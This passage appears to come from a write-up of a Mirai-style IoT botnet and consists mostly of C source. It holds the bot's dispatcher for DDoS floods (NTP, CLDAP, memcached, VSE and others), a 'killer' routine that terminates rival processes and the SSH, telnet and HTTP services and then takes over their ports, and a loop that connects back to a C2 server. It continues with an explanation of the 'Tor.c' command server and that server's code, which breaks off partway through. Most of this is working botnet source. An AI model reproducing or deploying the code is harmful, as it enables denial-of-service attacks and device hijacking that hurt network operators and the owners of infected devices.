        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL){
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL){
                if(!listFork()){
                    sendOvhBypassThree(hi, port, time);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            sendOvhBypassThree(ip, port, time);
            _exit(0);
        }
    }
    // vseattack command: sends a VSE attack to the specified IP and port for a given time
    if(!strcmp(argv[0], decode("g6m"))) {
        if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1) {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = 32;
        int packetsize = 1024;
        int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
        int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
        int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);

        if(strstr(ip, ",") != NULL) {
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL) {
                if(!listFork()) {
                    vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                    _exit(0);
                }   
                hi = strtok(NULL, ",");
            }
        } else {
            if (!listFork()) {
                vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                _exit(0);
            }
        }
    }
    // ripattack command: sends a RIP attack to the specified IP and port for a given time
    if(!strcmp(argv[0], decode("vx|"))) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        ripattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                ripattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        // echoattack command: sends an ECHO attack to the specified IP and port for a given time
        if(!strcmp(argv[0], decode("mDej"))) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        echoattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                echoattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        // xtdattack command: sends an XTD attack to the specified IP and port for a given time
        if(!strcmp(argv[0], decode("+c-"))) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        xtdattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                xtdattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        // cldapattack command: sends a CLDAP attack to the specified IP and port for a given time
        if(!strcmp(argv[0], decode("~-7|"))) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        cldapattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                cldapattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        // ntpattack command: sends an NTP attack to the specified IP and port for a given time
        if(!strcmp(argv[0], decode("6-|"))) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        ntpattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                ntpattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        // memattack command: sends a MEM attack to the specified IP and port for a given time
        if(!strcmp(argv[0], decode("hmh"))) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        memattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                memattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
                _exit(0);
            }
        }
        // combined attack command: sends multiple types of attacks to the specified IP and port for a given time
        if(!strcmp(argv[0], decode("<7hm"))) {
            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = 32;
            int packetsize = 1024;
            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        memattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        cldapattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        ntpattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        xtdattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                        memattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        ntpattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        xtdattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        cldapattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                    }
                _exit(0);
            }
        }
        // kills all child processes spawned by this program
        if(!strcmp(argv[0], decode("6cj|")))
        {
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++)
                {
                        if (pids[i] != 0 && pids[i] != getpid())
                        {
                                kill(pids[i], 9);
                                killed++;
                        }
                }
                if(killed > 0)
                {
                    //
                } else {
                            //
                       }
        }
}
// converts hexadecimal string to binary
void hex2bin(const char* in, size_t len, unsigned char* out) {
  static const unsigned char TBL[] = {
     0,   1,   2,   3,   4,   5,   6,   7,   8,   9,  58,  59,
    60,  61,  62,  63,  64,  10,  11,  12,  13,  14,  15
  };
  static const unsigned char *LOOKUP = TBL - 48;
  const char* end = in + len;

  while(in < end) *(out++) = LOOKUP[*(in++)] << 4 | LOOKUP[*(in++)];
}

// array of known bot signatures in hexadecimal format
char *knownBots[] = {
    // list of known bots
    // each string is a hexadecimal representation of a bot signature
};

// checks if a specific memory buffer contains any known bot signatures
int mem_exists(char *buf, int buf_len, char *str, int str_len) {
    int matches = 0;

    if (str_len > buf_len)
        return 0;

    while (buf_len--) {
        if (*buf++ == str[matches]) {
            if (++matches == str_len)
                return 1;
        } else
            matches = 0;
    }

    return 0;
}

int killer_pid;
char *killer_realpath;
int killer_realpath_len = 0;

// checks if the process has access to its own executable path
int has_exe_access(void) {
    char path[PATH_MAX], *ptr_path = path, tmp[16];
    int fd, k_rp_len;

    // construct the path to /proc/$pid/exe
    ptr_path += util_strcpy(ptr_path, "/proc/");
    ptr_path += util_strcpy(ptr_path, util_itoa(getpid(), 10, tmp));
    ptr_path += util_strcpy(ptr_path, "/exe");

    // attempt to open the file
    if ((fd = open(path, O_RDONLY)) == -1) {
        return 0;
    }
    close(fd);

    // read the symbolic link to get the real path of the process
    if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1) {
        killer_realpath[k_rp_len] = 0;
    }

    util_zero(path, ptr_path - path);

    return 1;
}

// matches memory signatures against known bots
int memory_j83j_match(char *path) {
    int fd, ret;
    char rdbuf[4096];
    int found = 0;
    int i;
    if ((fd = open(path, O_RDONLY)) == -1) return 0;
    unsigned char searchFor[64];
    util_zero(searchFor, sizeof(searchFor));

    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0) {
        for (i = 0; i < NUMITEMS(knownBots); i++) {
            hex2bin(knownBots[i], util_strlen(knownBots[i]), searchFor);
            if (mem_exists(rdbuf, ret, searchFor, util_strlen(searchFor))) {
                found = 1;
                break;
            }
            util_zero(searchFor, sizeof(searchFor));
        }
    }

    close(fd);

    return found;
}
#define KILLER_MIN_PID              1000
#define KILLER_RESTART_SCAN_TIME    1

// killer function that scans and kills certain processes
void killer_xywz(int parentpid)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_j83j = time(NULL), tmp_bind_fd;
    uint32_t j83j_counter = 0;
    struct sockaddr_in tmp_bind_addr;

    // let parent continue on main thread
    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;

    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;

#ifdef KILLER_REBIND_TELNET
    // kill telnet service and prevent it from restarting
    killer_kill_by_port(HTONS(23));
    
    tmp_bind_addr.sin_port = HTONS(23);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

#ifdef KILLER_REBIND_SSH
    // kill ssh service and prevent it from restarting
    killer_kill_by_port(HTONS(22));
    
    tmp_bind_addr.sin_port = HTONS(22);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

#ifdef KILLER_REBIND_HTTP
    // kill http service and prevent it from restarting
    killer_kill_by_port(HTONS(80));
    tmp_bind_addr.sin_port = HTONS(80);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

    // check for executable access and get real path
    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;

    if (!has_exe_access())
    {
        return;
    }

    while (1)
    {
        DIR *dir;
        struct dirent *file;
        if ((dir = opendir("/proc/")) == NULL)
        {
            break;
        }
        while ((file = readdir(dir)) != NULL)
        {
            // skip non-pid folders
            if (*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            char exe_path[64], realpath[PATH_MAX];
            char status_path[64];
            int rp_len, fd, pid = atoi(file->d_name);
            j83j_counter++;

            // skip certain pids
            if (pid <= killer_highest_pid && pid != parentpid || pid != getpid())
            {
                if (time(NULL) - last_pid_j83j > KILLER_RESTART_SCAN_TIME)
                    killer_highest_pid = KILLER_MIN_PID;
                else if (pid > KILLER_MIN_PID && j83j_counter % 10 == 0)
                    sleep(1); // sleep to wait for process spawn

                continue;
            }
            if (pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_j83j = time(NULL);

            // construct paths
            snprintf(exe_path, sizeof(exe_path), "/proc/%d/exe", pid);
            snprintf(status_path, sizeof(status_path), "/proc/%d/status", pid);

            // read the link of exe_path
            if ((rp_len = readlink(exe_path, realpath, sizeof(realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0; // null-terminate realpath

                // skip certain files
                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
                    continue;

                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
                    kill(pid, 9);
                }
                close(fd);
            }

            // check memory for known bots
            if (memory_j83j_match(exe_path))
            {
                kill(pid, 9);
            } 

            // clear path buffers
            util_zero(exe_path, sizeof(exe_path));
            util_zero(status_path, sizeof(status_path));

            sleep(1);
        }

        closedir(dir);
    }
}
int killer_kill_by_port(int port) {
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

    // convert network byte order port to string in hexadecimal
    util_itoa(ntohs(port), 16, port_str);
    // handle cases where the port string length is 2
    if (util_strlen(port_str) == 2) {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;
        port_str[0] = '0';
        port_str[1] = '0';
    }

    // open the tcp file to read the current tcp connections
    fd = open("/proc/net/tcp", O_RDONLY);
    if (fd == -1) return 0;

    // read each line in the tcp file
    while (util_fdgets(buffer, 512, fd) != NULL) {
        int i = 0, ii = 0;

        // find the position of the first ':' character
        while (buffer[i] != 0 && buffer[i] != ':') i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        // find the position of the first space after the ':'
        while (buffer[i] != 0 && buffer[i] != ' ') i++;
        buffer[i++] = 0;

        // check if this line corresponds to the port we're interested in
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1) {
            int column_index = 0;
            int in_column = 0;
            int listening_state = 0;

            // parse through the columns
            while (column_index < 7 && buffer[++i] != 0) {
                if (buffer[i] == ' ' || buffer[i] == '\t') in_column = 1;
                else {
                    if (in_column == 1) column_index++;
                    if (in_column == 1 && column_index == 1 && buffer[i + 1] == 'A') listening_state = 1;
                    in_column = 0;
                }
            }
            ii = i;

            if (listening_state == 0) continue;

            // find the inode associated with this connection
            while (buffer[i] != 0 && buffer[i] != ' ') i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15) continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    // if we didn't find the inode, return
    if (util_strlen(inode) == 0) return 0;

    // iterate over all processes to find the one that holds the port
    if ((dir = opendir("/proc/")) != NULL) {
        while ((entry = readdir(dir)) != NULL && ret == 0) {
            char *pid = entry->d_name;

            // skip non-numeric directories
            if (*pid < '0' || *pid > '9') continue;

            // construct the path to the process's exe link
            util_strcpy(ptr_path, "/proc/");
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), "/exe");

            // read the link to the process's executable
            if (readlink(path, exe, PATH_MAX) == -1) continue;

            // check the file descriptors of the process
            util_strcpy(ptr_path, "/proc/");
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), "/fd");
            if ((fd_dir = opendir(path)) != NULL) {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0) {
                    char *fd_str = fd_entry->d_name;

                    // clear and reconstruct the path
                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, "/proc/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/fd");
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1) continue;

                    // if this file descriptor matches the inode, kill the process
                    if (util_stristr(exe, util_strlen(exe), inode) != -1) {
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    return ret;
}

/**
 * etablishes connection to the next server in the list
 * cycles through a list of servers and attempts to connect to each using a timeout
 * 
 * @return 1 on successful connection, 0 on failure.
 */
int initConnection()
{
    unsigned char server[512];
    memset(server, 0, sizeof(server)); // clear server buffer

    // close existing socket if it's open
    if (mainCommSock) { 
        close(mainCommSock); 
        mainCommSock = 0; 
    }

    // cycle through server list
    if (currentServer + 1 == SERVER_LIST_SIZE) 
        currentServer = 0;
    else 
        currentServer++;

    // copy next server address
    strcpy(server, agagag[currentServer]);

    // default port number
    int port = 6982;

    // check if a specific port is specified in the server address
    char *portPtr = strchr(server, ':');
    if (portPtr != NULL) {
        port = atoi(portPtr + 1);
        *portPtr = '\0'; // split the string at the colon to isolate the IP address
    }

    // create TCP socket
    mainCommSock = socket(AF_INET, SOCK_STREAM, 0);
    if (mainCommSock < 0) {
        perror("Socket creation failed");
        return 0;
    }

    // connect with a timeout
    if (!connectTimeout(mainCommSock, server, port, 30)) {
        close(mainCommSock); // Close the socket if the connection fails
        return 0;
    }

    return 1; // connection successful
}
int main(int argc, unsigned char *argv[]) {
    // initiate killer process
    killer_xywz(getppid());

    // open file for writing
    FILE* fpd = fopen("lmao", "w+");

    // write messages to the file
    fprintf(fpd, BANNER);

    // print the same messages to stdout
    printf(BANNER);

    // check if server list size is not less than or equal to zero and return if so
    if (SERVER_LIST_SIZE <= 0) return 0;

    // seed random number generator
    srand(time(NULL) ^ getpid());
    init_rand(time(NULL) ^ getpid());
    getMyIP();

    pid_t pid1, pid2;
    int status;

    // create a child process
    if (pid1 = fork()) {
        waitpid(pid1, &status, 0);
        exit(0);
    } else if (!pid1) {
        if (pid2 = fork()) {
            exit(0);
        } else if (!pid2) {
            // empty branch
        } else {
            // empty branch
        }
    } else {
        // empty branch
    }

    // set up a new session and change working directory
    setsid();
    chdir("/");

    // ignore SIGPIPE signal
    signal(SIGPIPE, SIG_IGN);

    // main loop
    while (1) {
        // check if connection can be initialized, sleep for 5 seconds and continue if not
        if (initConnection()) {
            sleep(5);
            continue;
        }

        // print device connection details
        sockprintf(mainCommSock, "\e[1;95mDevice Connected: %s | Port: %s | Arch: %s\e[0m", inet_ntoa(myIP), getPortz(), getArch());

        char commBuf[4096];
        int got = 0;
        int i = 0;

        // receive commands
        while ((got = recvLine(mainCommSock, commBuf, 4096)) != -1) {
            // check for dead child processes
            for (i = 0; i < numpids; i++) {
                if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                    unsigned int *newpids, on;
                    for (on = i + 1; on < numpids; on++) pids[on - 1] = pids[on];
                    pids[on - 1] = 0;
                    numpids--;
                    newpids = (unsigned int *)malloc((numpids + 1) * sizeof(unsigned int));
                    for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                    free(pids);
                    pids = newpids;
                }
            }

            // null terminate the received command
            commBuf[got] = 0x00;

            // remove whitespaces from the command
            trim(commBuf);

            unsigned char *message = commBuf;

            // check if the command starts with '!'
            if (*message == '!') {
                unsigned char *nickMask = message + 1;
                while (*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                if (*nickMask == 0x00) continue;
                *(nickMask) = 0x00;
                nickMask = message + 1;

                message = message + strlen(nickMask) + 2;
                while (message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;

                unsigned char *command = message;
                while (*message != ' ' && *message != 0x00) message++;
                *message = 0x00;
                message++;

                unsigned char *tmpcommand = command;
                while (*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }

                unsigned char *params[10];
                int paramsCount = 1;
                unsigned char *pch = strtok(message, " ");
                params[0] = command;

                while (pch) {
                    if (*pch != '\n') {
                        params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                        memset(params[paramsCount], 0, strlen(pch) + 1);
                        strcpy(params[paramsCount], pch);
                        paramsCount++;
                    }
                    pch = strtok(NULL, " ");
                }

                processCmd(paramsCount, params);

                if (paramsCount > 1) {
                    int q = 1;
                    for (q = 1; q < paramsCount; q++) {
                        free(params[q]);
                    }
                }
            }
        }
    }

    return 0;

```

## **Tor.c**
the `Tor.c` script serves as the zombie master (C2) server in the botnet system. it manages connections from clients, processes commands from users, and sends commands to its zombies.

**user authentication**: the script uses a simple but effective authentication mechanism to ensure that only authorized users can interact with the botnet. the `strcmp` function is used to compare the entered password (`buf`) with the stored password (`accounts[find_line].password`). if the passwords don't match, the `goto` statement jumps to the `failed` label, which then disconnects the client. this mechanism is implemented in the `clientWorker` function, which handles interactions with each connected client.

**`TitleWriter`**: this function is a separate thread that runs in an infinite loop, updating the title in the terminal every second. it uses the `sprintf` function to format a string that includes the number of connected bots (`clientCount`) and the number of clients (`managersCount`). the `write` function is used to update the terminal title with this string, which provides a real-time update on the size of the botnet.

**command handling**: implemented in the `clientWorker` function. it uses the `FD_ISSET` function to check if there's data to read from the client's socket. if there is, it reads the data into a buffer (`buf`) and then uses a series of `if` statements to check for specific command. for example, if the `STATS` command is detected, it uses the `sprintf` and `send` functions to send back a string that includes the number of connected bots and the number of clients.

**banner display**: self-explanatory. once authentication is successful, a banner is sent to the client. this is just to provide a user-friendly interface.

**connection management**: handled in the `main` function. it uses the `socket`, `setsockopt`, `bind`, and `listen` functions to set up a socket that listens for incoming connections. when a bot client connects (`accept`), the server adds the client's IP address to its list of connected clients (`clientList`) and starts a new thread (`pthread_create`). [*note*: for concurrency control, a mutex (`pthread_mutex_t`) is used to control access to shared resources (like `clientList`) among multiple threads. this prevents race conditions and ensures that the server operates correctly when handling multiple clients simultaneously.] 

**multi-threading**: the `pthread` library is used for this.

**signal handling**: a signal handler for the `SIGPIPE` signal is included. this signal is sent to a process when it tries to write to a socket that has been closed on the other end. by ignoring this signal (`signal(SIGPIPE, SIG_IGN)`), the script prevens the server from crashing when it tries to write to a disconnected client socket.

**error handling**: error handling mechanisms to make the botnet more robust. for example, `socket`, `bind`, `listen`, `accept` all return a value that is checked against `-1` (error). if an error is detected, the `perror` function is used to print a descriptive error message and the `exit` function is used to terminate the program.

```c
// libraries
#include <stdio.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <signal.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>

#define MAXFDS 1000000

// xlient data structure
struct clientdata_t {
    uint32_t ip;       // xlient IP address
    char connected;    // connection status
} clients[MAXFDS];

// arguments structure for threading
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};

// telnet data structure
struct telnetdata_t {
    int connected;     // connection status
} managements[MAXFDS];

// user login data structure
struct violaTor_login {
    char username[100];
    char password[100];
};
static struct violaTor_login accounts[100];

// global file and socket descriptors
static volatile FILE *telFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;
static volatile int OperatorsConnected = 0;

// read from file descriptor into a buffer
int fdgets(unsigned char *buffer, int bufferSize, int fd) {
    int total = 0, got = 1;
    while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') {
        got = read(fd, buffer + total, 1);
        total++;
    }
    return got;
}

// trim whitespace from a string
void trim(char *str) {
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}

// make a socket non-blocking
static int make_socket_non_blocking(int sfd) {
    int flags, s;
    flags = fcntl(sfd, F_GETFL, 0);
    if (flags == -1) {
        perror("fcntl");
        return -1;
    }
    flags |= O_NONBLOCK;
    s = fcntl(sfd, F_SETFL, flags);
    if (s == -1) {
        perror("fcntl");
        return -1;
    }
    return 0;
}

// create and bind a socket to a port
static int create_and_bind(char *port) {
    struct addrinfo hints;
    struct addrinfo *result, *rp;
    int s, sfd;
    memset(&hints, 0, sizeof(struct addrinfo));
    hints.ai_family = AF_UNSPEC;       // IPv4 or IPv6
    hints.ai_socktype = SOCK_STREAM;   // TCP
    hints.ai_flags = AI_PASSIVE;       // all interfaces
    s = getaddrinfo(NULL, port, &hints, &result);
    if (s != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
        return -1;
    }
    for (rp = result; rp != NULL; rp = rp->ai_next) {
        sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sfd == -1) continue;
        int yes = 1;
        if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
            perror("setsockopt");
        s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
        if (s == 0) {
            break;
        }
        close(sfd);
    }
    if (rp == NULL) {
        fprintf(stderr, "unable to bind\n");
        return -1;
    }
    freeaddrinfo(result);
    return sfd;
}
// handling bot events
void *BotEventLoop(void *useless) {
    struct epoll_event event; // declare an epoll_event structure for event handling
    struct epoll_event *events; // declare a pointer for multiple events
    int s; // variable for error checking
    events = calloc(MAXFDS, sizeof event); // allocate memory for events based on max file descriptor size

    // infinite loop for event processing
    while (1) {
        int n, i; // variables for number of events and iterator
        n = epoll_wait(epollFD, events, MAXFDS, -1); // wait for events on epoll file descriptor

        // iterate through the number of events
        for (i = 0; i < n; i++) {
            // check if there are any errors or hangups and no data to read
            if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
                clients[events[i].data.fd].connected = 0; // mark client as not connected
                close(events[i].data.fd); // close the file descriptor
                continue; // move to the next event
            }
            // check if the event is on the listening file descriptor
            else if (listenFD == events[i].data.fd) {
                while (1) {
                    struct sockaddr in_addr; // sockaddr structure for client address
                    socklen_t in_len; // variable for address length
                    int infd, ipIndex; // variables for incoming file descriptor and index

                    in_len = sizeof in_addr; // set the size of in_addr
                    infd = accept(listenFD, &in_addr, &in_len); // accept new connections

                    // check for errors in accept call
                    if (infd == -1) {
                        if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) // check if the error is due to non-blocking I/O
                            break; // no more incoming connections, break the loop
                        else {
                            perror("accept"); // print accept error message
                            break; // break the loop
                        }
                    }

                    // store the client IP address
                    clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;

                    // check for duplicate connections
                    int dup = 0; // flag for duplicate
                    for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
                        if (!clients[ipIndex].connected || ipIndex == infd) continue; // skip if not connected or same file descriptor
                        if (clients[ipIndex].ip == clients[infd].ip) { // check if IP address is the same
                            dup = 1; // set duplicate flag
                            break; // break the loop
                        }
                    }

                    // if duplicate connection found
                    if (dup) {
                        if (send(infd, "[!] KILLBIE\n", 13, MSG_NOSIGNAL) == -1) { // try to send botkill message
                            close(infd); // close the file descriptor if send fails
                            continue; // continue to the next event
                        }
                        close(infd); // close the file descriptor
                        continue; // continue to the next event
                    }

                    // make the socket non-blocking
                    s = make_socket_non_blocking(infd);
                    if (s == -1) { // check for errors
                        close(infd); // close the file descriptor on error
                        break; // break the loop
                    }

                    // set up the event structure for the new socket
                    event.data.fd = infd;
                    event.events = EPOLLIN | EPOLLET; // set events to input and edge-triggered
